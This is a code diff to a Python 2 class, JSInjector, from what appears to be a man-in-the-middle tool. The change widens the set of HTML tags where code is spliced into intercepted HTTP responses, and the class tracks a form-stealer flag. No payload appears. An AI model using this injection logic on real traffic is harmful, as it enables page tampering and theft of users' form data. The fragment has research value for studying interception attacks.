@@ -4,22 +4,22 @@ from Functions import Functions
 class JSInjector:
     def __init__(self):
         self._tools = Functions()
-        self._injectionPlaces = ["</head>", "<script ", "</body>", "<div>"]
+        self._injectionPlaces = ["</head>", "<script ", "</body>", "<div>", "<title>", "<link rel", "<p ", "<br/>"]
         self._hasFormStealer = False
 
-    def injectScriptIntoHeader(self, response, codeToInject=""):
+    def injectScriptIntoHeader(self, response, code_to_inject=""):
         header = self._tools.getHeader(response)
-        oldresponse = (response, 0)
+        oldresponse = response, 0
         injected_script = False
-
 
         # Try to inject code into the response body
         for ijplace in self._injectionPlaces:
             try:
                 print "[*] Try to inject code in: " + str(ijplace)
                 start = response.index(ijplace)
-                response = response[:start] + codeToInject + response[start:]
+                response = response[:start] + code_to_inject + response[start:]
                 injected_script = True
+                print "[*] Code in front of " + str(ijplace) + " injected!"
                 break
             except Exception:
                 #print "[*] " + str(ijplace) + " failed! Next..."
@@ -30,7 +30,7 @@ class JSInjector:
             return oldresponse
 
         # Calculate the new length and change it in the header
-        headernew, status = self._tools.changeContentlength(header, len(codeToInject))
+        headernew, status = self._tools.changeContentlength(header, len(code_to_inject))
 
         # If both are true we are ready to change all in the response
         try:
